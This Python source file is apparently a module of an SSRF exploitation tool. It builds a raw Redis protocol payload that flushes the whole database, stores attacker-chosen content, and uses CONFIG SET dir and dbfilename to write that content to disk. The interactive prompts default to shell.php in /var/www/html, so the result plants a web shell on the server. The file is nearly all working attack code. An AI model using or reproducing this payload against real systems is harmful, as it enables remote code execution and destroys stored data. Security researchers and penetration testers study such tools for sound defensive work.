
from .base import *
import os

class Redis(GENERATOR):
    requirement = ["content", "dir", "filename"]
    def __init__(self, parser,options={}):
        if options["port"] == 0:
            options["port"] = 6379
        super().__init__(parser,options)
        self.set_requirement(self.requirement)
        arg = self.get_requirement()

        if arg.dir == "":
            self.dir = self.wizard_dir()
        else:
            self.dir = arg.dir

        if arg.filename == "":
            self.filename = self.wizard_filename()
        else:
            self.filename = arg.filename
        try:
            with open(self.filename, "r") as f:
                self.content = f.read()
        except:
            self.content = ""
            if arg.content == "":
                self.content = self.wizard_content()
            else:
                self.content = arg.content

    def generate(self):
        content = self.content
        dir = self.dir
        filename = self.filename
        len_content = len(content) + 4
        
        payload = f"""*1\r
$8\r
flushall\r
*3\r
$3\r
set\r
$1\r
1\r
${str(len_content)}\r


{content}


\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
${str(len(dir))}\r
{dir}\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
${str(len(filename))}\r
{filename}\r
*1\r
$4\r
save\r

"""

        self.set_mode(PAYLOAD_TYPE.QUOTE_PLUS).set_payload(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
        return super().generate()
    
    def wizard_content(self):
        content = input("\033[96m" + "Content: " + "\033[0m")
        return content
    def wizard_filename(self):
        filename = input("\033[96m" + "Filename (shell.php): " + "\033[0m")
        return filename
    def wizard_dir(self):
        dir = input("\033[96m" + "Directory (/var/www/html): " + "\033[0m")
        return dir
